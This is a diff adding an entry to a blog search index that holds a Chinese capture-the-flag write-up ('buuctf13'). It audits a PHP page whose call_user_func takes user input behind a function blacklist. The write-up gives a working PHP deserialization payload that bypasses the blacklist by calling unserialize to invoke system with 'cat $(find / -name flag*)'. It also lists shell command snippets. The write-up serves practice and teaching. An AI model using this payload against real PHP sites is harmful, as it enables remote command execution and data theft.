@@ -3780,4 +3780,35 @@
         <tag>刷题</tag>
       </tags>
   </entry>
+  <entry>
+    <title>buuctf13</title>
+    <url>/2021/07/23/buuctf13/</url>
+    <content><![CDATA[<p>打开容器，发现网页每隔几秒就会刷新一次</p>
+<h4 id="一-初期探索"><a href="#一-初期探索" class="headerlink" title="一.初期探索"></a>一.初期探索</h4><p>查看网页源码，没什么线索，抓包试试</p>
+<p><img src="/2021/07/23/buuctf13/image-20210724103058351.png"></p>
+<p>我们看到这个date应该是个函数名，返回给我们时间然后p的值是date()函数的参数，因此这个可能利用了call_user_func()函数：<strong>call_user_func(函数名，参数)：</strong>调用传递函数，并返回函数运行的结果（本题中即为执行$func($p)）</p>
+<p>那么我们就以试试用file_get_contents()函数读取文件，试试能不能直接读取flag文件，一般flag都在根目录下尝试<img src="/2021/07/23/buuctf13/image-20210724103931674.png" alt="image-20210724103931674"></p>
+<p>没找到，试了几次路径也不行，看来心急了，读取index.php试试：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  &lt;?php</span><br><span class="line">&#x2F;&#x2F;定义段代码    </span><br><span class="line">$disable_fun &#x3D; array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);</span><br><span class="line">    function gettime($func, $p) &#123;</span><br><span class="line">        $result &#x3D; call_user_func($func, $p);</span><br><span class="line">        $a&#x3D; gettype($result);</span><br><span class="line">        if ($a &#x3D;&#x3D; &quot;string&quot;) &#123;</span><br><span class="line">            return $result;</span><br><span class="line">        &#125; else &#123;return &quot;&quot;;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class Test &#123;</span><br><span class="line">        var $p &#x3D; &quot;Y-m-d h:i:s a&quot;;</span><br><span class="line">        var $func &#x3D; &quot;date&quot;;</span><br><span class="line">        function __destruct() &#123;</span><br><span class="line">            if ($this-&gt;func !&#x3D; &quot;&quot;) &#123;</span><br><span class="line">                echo gettime($this-&gt;func, $this-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">  &#x2F;&#x2F;执行代码段</span><br><span class="line">    $func &#x3D; $_REQUEST[&quot;func&quot;];</span><br><span class="line">    $p &#x3D; $_REQUEST[&quot;p&quot;];</span><br><span class="line"></span><br><span class="line">    if ($func !&#x3D; null) &#123;</span><br><span class="line">        $func &#x3D; strtolower($func);</span><br><span class="line">        if (!in_array($func,$disable_fun)) &#123;</span><br><span class="line">            echo gettime($func, $p);</span><br><span class="line">        &#125;else &#123;</span><br><span class="line">            die(&quot;Hacker...&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="二-代码审计"><a href="#二-代码审计" class="headerlink" title="二.代码审计"></a>二.代码审计</h4><p>我们看到它设立了一个黑名单，禁了很多命令；定义了gettime()函数——调用call_user_func()函数，并返回字符串内容；定义了Text类；同时上传两个参数，if语句判断上传的 $func中是否存在黑名单中的命令，不存在则输出调用gettime()函数。</p>
+<h4 id="三-思路构建"><a href="#三-思路构建" class="headerlink" title="三.思路构建"></a>三.思路构建</h4><p>我们看到它定义了一个类，但是它本身并没有利用这个类，那我们可以尝试构造一个序列化字符串，绕过$func的黑名单检测。</p>
+<p>payload：<code>$func=unserialize,$p=序列化字符串</code></p>
+<p>那么我们怎么利用这个反序列化呢？我们看到它反序列化的过程会根据我们序列化字符串的赋值来执行。也就是说可以通过反序列化对$func和$p再赋值。这样我们就可以绕开黑名单的限制了。</p>
+<p><strong>sp：常用命令小结</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">system(&#39;ls&#39;) : 列举当前目录下的所有文件</span><br><span class="line"></span><br><span class="line">system(&quot;find &#x2F; -name flag*&quot;)：查找所有文件名匹配flag的文件</span><br><span class="line"></span><br><span class="line">system(&quot;cat $(find &#x2F; -name flag*)&quot;)：打印所有文件名匹配flag的文件</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>构造序列化字符串：</strong></p>
+<p><img src="/2021/07/23/buuctf13/image-20210724114547651.png" alt="image-20210724114547651"></p>
+<p>因此我们最后的payload就是：<code>func=unserialize&amp;p=O:4:&quot;Test&quot;:2:&#123;s:1:&quot;p&quot;;s:25:&quot;cat $(find / -name flag*)&quot;;s:4:&quot;func&quot;;s:6:&quot;system&quot;;&#125;</code></p>
+<p><img src="/2021/07/23/buuctf13/image-20210724114817900.png" alt="image-20210724114817900"></p>
+]]></content>
+      <tags>
+        <tag>刷题</tag>
+      </tags>
+  </entry>
 </search>
